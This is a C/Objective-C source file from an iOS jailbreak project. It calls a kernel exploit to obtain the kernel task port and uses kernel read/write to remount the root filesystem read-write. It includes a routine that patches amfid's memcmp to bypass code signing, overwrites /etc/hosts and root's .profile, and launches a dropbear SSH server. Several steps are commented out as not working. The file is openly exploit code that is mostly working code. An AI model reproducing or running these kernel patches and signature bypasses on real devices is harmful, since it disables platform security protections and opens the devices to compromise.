//
//  jailbreak.c
//  partialJailbreak
//
//  Created by hongs on 8/11/18.
//  Copyright (c) 2017 Siguza & tihmstar
//  Copyright © 2018 hongs. All rights reserved.
//

#include "jailbreak.h"
#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#include "arch.h"
#include "exploit64.h"

#include "getshell.h"
#include "libjb.h"

#include <dlfcn.h>
#include <copyfile.h>
#include <stdio.h>
#include <spawn.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>


#include "kppless.h"
#include "amfi.h"
#include "libmis.h"
#include "patchfinder64.h"

// For '/' remount (not offsets)
#define OFFSET_ROOT_MOUNT_V_NODE 0xffffff8004536070 // nm kernelcache-decrypt-6s-n71ap-9.3  | grep -E " _rootvnode$"
#define OFFSET_TEXT_HEADER 0xFFFFFF8004004000 // IDA, go view -> open subviews -> segments and find the __TEXT:HEADER segment,the start should be FFFFFF8004004000

#define KSTRUCT_OFFSET_MOUNT_MNT_FLAG   0x70
#define KSTRUCT_OFFSET_VNODE_V_UN       0xd8


int file_exist (char *filename)
{
    struct stat   buffer;
    return (stat (filename, &buffer) == 0);
}


// remount root partition r/W
int remount_rw(task_t tfp0, vm_address_t kbase) {
    
    // Need these so struct vnode is properly defined:
    /* 0x00 */   LIST_HEAD(buflists, buf);
    /* 0x10 */   typedef  void *kauth_action_t ;
    /* 0x18 */   typedef  struct {
        uint64_t    x[2];
        /* 0x28 */   } lck_mtx_t;
#if 0   // Cut/paste struct vnode (bsd/sys/vnode_internal.h) here (omitted for brevity)
    struct vnode {
        /* 0x00 */  lck_mtx_t v_lock;
        /* 0x28 */  TAILQ_ENTRY(vnode) v_freelist;
        /* 0x38 */  TAILQ_ENTRY(vnode) v_mntvnodes;
        /* 0x48 */  TAILQ_HEAD(, namecache) v_ncchildren; /* name cache entries that regard us as their pare
                                                           /* 0x58 */  LIST_HEAD(, namecache) v_nclinks;     /* name cache entries that name this vnode */
        ....
        /* 0xd8 */  mount_t v_mount;                      /* ptr to vfs we are in */
    };
    // mount_t (struct mount *) can similarly be obtained from bsd/sys/mount_internal.h
    //  The specific mount flags are a uint32_t at offset 0x70
#endif
    
    // prepare kernel r/w
    prepare_rwk_via_tfp0(tfp0);
    
    //read rootfs_vnode from memory
    uint64_t kslide = kbase - OFFSET_TEXT_HEADER;
    uint64_t _rootnode = OFFSET_ROOT_MOUNT_V_NODE + kslide;
    uint64_t rootfs_vnode = ReadAnywhere64(_rootnode);
    
    // remove mnt_rootfs flag
    uint64_t v_mount = ReadAnywhere64(rootfs_vnode + KSTRUCT_OFFSET_VNODE_V_UN);
    uint32_t v_flag = ReadAnywhere32(v_mount + KSTRUCT_OFFSET_MOUNT_MNT_FLAG + 1);
    WriteAnywhere32(v_mount + KSTRUCT_OFFSET_MOUNT_MNT_FLAG + 1, v_flag & ~(MNT_ROOTFS << 6));
    
    // remount it
    char* nmz = strdup("/dev/disk0s1s1");
    int rv = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
    printf("RC: %d (flags: 0x%x) %s \n", rv, v_flag, strerror(errno));
    
    // set it back
    v_mount = ReadAnywhere64(rootfs_vnode + KSTRUCT_OFFSET_VNODE_V_UN);
    WriteAnywhere32(v_mount + KSTRUCT_OFFSET_MOUNT_MNT_FLAG + 1, v_flag);
    
    // check r/w on /
    int fd = open("/.bit_of_fun", O_RDONLY);
    if (fd == -1) {
        fd = creat("/.bit_of_fun", 0644);
    } else {
        printf("File already exists!\n");
    }
    close(fd);
    printf("Did we mount / as read + write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
    return rv;
}


int amfid(){
    
    //amfid
    uint64_t memcmp_got = find_amfi_memcmpstub();
    uint64_t ret1 = find_ret_0();
    
    //RemapPage(memcmp_got);
    WriteAnywhere64(ReadAnywhere64(memcmp_got), ret1);
    return 0;
}

static int party_hard(void)
{
    int ret = -1;
    if(getuid() != 0) // Skip if we got root already
    {
        vm_address_t kernel_base = 0;
        // get tfp0
        task_t tfp0 = exploit64();
        LOG("kernel_task: 0x%x", tfp0);
        // find kernel base
        kernel_base = find_kernel_base(tfp0);
        LOG("kernel base:  0x%x\n", kernel_base);
        // initialize patchfinder64 & amfi stuff, need to patch for iOS < 10, just commit now
        // init_patchfinder(NULL, kernel_base);
        // init_amfi();
        // remount root partition as r/w
        // ret = remount_rw(tfp0, kernel_base); //do not work, operation not permitted
        //amfid();
    }
    return 0;
}


bool jailbreak(void){
    LOG("start jailbreaking");
    if(party_hard() == 0){
        
        char path[4096];
        uint32_t size = sizeof(path);
        _NSGetExecutablePath(path, &size);
        char *pt = realpath(path, NULL);
        
        NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
        
        
        NSString *tar = [execpath stringByAppendingPathComponent:@"tar-sig"];
        NSString *bash = [execpath stringByAppendingPathComponent:@"bash-arm64-sig"];
        NSString *dropbear = [execpath stringByAppendingPathComponent:@"dropbear-sig"];
        NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
        NSString *profile = [execpath stringByAppendingPathComponent:@"profile"];
        NSString *hosts = [execpath stringByAppendingPathComponent:@"hosts"];
        //NSString *kernelcache = [execpath stringByAppendingPathComponent:@"kernelcache-decrypt-6s-n71ap-9.3"];
        
        chdir("/tmp");
        mkdir("/tmp/etc", 0775);
        mkdir("/tmp/etc/dropbear", 0775);
        
        // copy file
        copyfile([tar UTF8String], "/tmp/tar-sig", 0, COPYFILE_ALL);
        //copyfile([bash UTF8String], "/bin/sh", 0, COPYFILE_ALL);
        copyfile([bash UTF8String], "/tmp/bash-arm64-sig", 0, COPYFILE_ALL);
        copyfile([dropbear UTF8String], "/tmp/dropbear-sig", 0, COPYFILE_ALL);
        copyfile([profile UTF8String], "/var/root/.profile", 0, COPYFILE_ALL);
        copyfile([hosts UTF8String], "/etc/hosts", 0, COPYFILE_ALL);
        //copyfile([kernelcache UTF8String], "/tmp/kernelcache-decrypt", 0, COPYFILE_ALL);
        
        //chmod
        chmod("/tmp/tar-sig", 0755);
        //  chmod("/bin/sh", 0755);
        chmod("/tmp/bash-arm64-sig", 0755);
        chmod("/tmp/dropbear-sig", 0755);
        
        //inject amfid
        //inject_trust("tmp/bash-arm64-sig");
        //inject_trust("/tmp/dropbear-sig");
        
        /* using untar function to unzip bootstrap.tar */
        LOG("untar and drop bootstrap.tar into /tmp\n");
        FILE *a = fopen([bootstrap UTF8String], "rb");
        chdir("/tmp");
        untar(a, "bootstrap");
        fclose(a);
        
        //printf("misvalid is ok = %d\n",libmis("/tmp/dropbear-sig"));
        
        /* getshell */
        
        //getshell();
        
        /* exec cmd, need amfid injection, just commit now */
        // int pd;
        /*posix_spawn(&pd, "/tmp/tar-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/tar-sig", "--preserve-permissions", "--no-overwrite-dir", "-xf", [bootstrap UTF8String], NULL }, NULL);
         NSLog(@"pid = %x", pd);
         waitpid(pd, NULL, 0);
         sleep(1);
         */
        
        //launch dropbear
        int pd;
        posix_spawn(&pd, "/tmp/dropbear-sig", NULL, NULL, (char **)&(const char*[]){ "/tmp/dropbear-sig", "-RE", "-p", "127.0.0.1:2222",NULL }, NULL);
        //LOG(@"pid = %x", pd);
        LOG("done!");
        waitpid(pd, NULL, 0);
        
        
        return 0;
        
    }
    return 0;
    
}
